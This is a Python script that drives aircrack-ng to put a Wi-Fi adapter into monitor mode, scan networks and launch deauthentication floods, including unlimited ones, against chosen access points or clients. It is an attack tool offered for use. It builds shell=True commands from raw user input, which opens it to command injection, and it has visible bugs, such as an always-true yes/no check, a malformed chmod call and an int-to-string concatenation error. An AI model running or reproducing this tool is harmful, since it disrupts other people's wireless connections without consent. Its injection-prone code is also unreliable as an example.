import subprocess
import colorama
import sys


def deauth():
    print(colorama.Fore.LIGHTBLUE_EX + """\t
                     
                     WEEP BY AJ as JF
                

                    ^^^^^^^^\    	  /^^^^^^		
                  ^^^^^^^^^^^\           /^^^^^^^^^
                ^^^^^^^^^^^^^^\		/^^^^^^^^^^^^^						
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
           ^^^^^^^^^^^ ____^^^^^^^^^__________^^^^^^^^^^^^^^
         ^^^^^^^^^^^^^|   |^^^^^^^^^^^^^^|^^^^^^^^^^^^^^^^^^^^
       ^^^^^^^^^^^^^^^|   |^^^^^^^^^^^^^^|^^^^^^^^^^^^^^^^^^^^^
       ^^^^^^^^^^^^^^^|   |^^^^^^^^^^^^^^|^^^^^^^^^^^^^^^^^^^^^^^
      ^^^^^^^^^^^^^^^^|^^^|^^^^^^^^^^^^^^|^^^^^^^^^^^^^^^^^^^^
          ^^^^^^^^^^^^|^^^|^^^^^^^^^^^^^^|^^^^^^^^^^^^^^^^^^^
                ^^^^^^|   |^^^^^^^^^^____|^^^^^^^^^^^^^
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                         ^^^^^^^^^^^^^^^^^^^^^^
                           ^^^^^^^^^^^^^^^^
                              ^^^^^^^^
                                ^^^^
                                 ^^					
			         ***
			         ***
            
    
    """)
    subprocess.call("sudo chmod+X replay.sh", shell=True)
    print(colorama.Fore.RED + "\t [+]You must have external wifiAdapter \n")
    adapterName = input(colorama.Fore.CYAN + "Enter Adapter name >")
    choice = input(colorama.Fore.CYAN + "Do you want to change monitor Y or N >")

    if choice == "y" or "Y" :
        try:
            subprocess.call("sudo airmon-ng start " + adapterName, shell=True)
            print(colorama.Fore.GREEN + "\t[+] Adapter changed to monitor mode")

        except Exception as e:
            print(e)
            print(colorama.Fore.RED + "\t[+] oops Something wnt wrong!")

    Options = int(input(colorama.Fore.CYAN + """
    1. Scan network >
    2. Deauth network >
    """))

    if Options == 1:
        op2 = int(input(colorama.Fore.CYAN + """
        1.Whole Network
        2. Particular Netork
        """))
        if op2 == 1:
            adapterName = adapterName + "mon"
            subprocess.call("sudo airodump-ng " + adapterName, shell=True)
            print(colorama.Fore.GREEN + "\t Whole network Scanned completed ^_^")
        elif op2 == 2:
            adapterName = adapterName + "mon"
            Bssid = input(colorama.Fore.CYAN + "Enter Bssid >")
            channel = input(colorama.Fore.CYAN + "Enter Channel Number >")
            subprocess.call("sudo airodump-ng --bssid " + Bssid + " --channel " + channel + " " + adapterName, shell=True)

    elif Options == 2:
        adapterName = adapterName + "mon"
        time = int(input(colorama.Fore.CYAN + "Type any number if you type zero(0) it was limitless deauth >"))
        if time > 0 :
            rule = int(input(colorama.Fore.CYAN + """
            1.Single station(Network) >
            2. Whole station(Network) >
            """))
            if rule == 1:
                bssid = input(colorama.Fore.CYAN + "Enter Bssid >")
                station = input(colorama.Fore.CYAN + "Enter station number >")
                loop = input(colorama.Fore.CYAN + "How many becons do you want to send >")
                subprocess.call("sudo aireplay-ng --deauth " + loop + " -a " + bssid + " -c " + station + " " + adapterName, shell=True)
            elif rule == 2:
                bssid = input(colorama.Fore.CYAN + "Enter Bssid >")
                subprocess.call(
                    "sudo aireplay-ng --deauth " + time + " -a " + bssid + " -c " + " " + adapterName,
                    shell=True)
            else:
                print(colorama.Fore.RED + "\t oops! Wrong Option! ")
        elif time == 0:
            rule = int(input(colorama.Fore.CYAN + """
            1.Single station(Network1) >
            2. Whole station(Network) >
            """))
            if rule == 1:
                bssid = input(colorama.Fore.CYAN + "Enter Bssid >")
                station = input(colorama.Fore.CYAN + "Enter station number >")
                subprocess.call("sudo aireplay-ng --deauth 0" + " -a " + bssid + " -c " + station + " " + adapterName,
                                shell=True)
            elif rule == 2:
                Bssid = input(colorama.Fore.CYAN + "Enter Bssid >")
                subprocess.call("sudo aireplay-ng --deauth 0" + " -a " + Bssid + " " + adapterName,
                        shell=True)
            else:
                    print("Sorry Going to Quit")
                    sys.exit()
        else:
            print(colorama.Fore.RED + "Oops! Wrong option!")

    else:
        print(colorama.Fore.RED + "Oops! Wrong Option")


deauth()
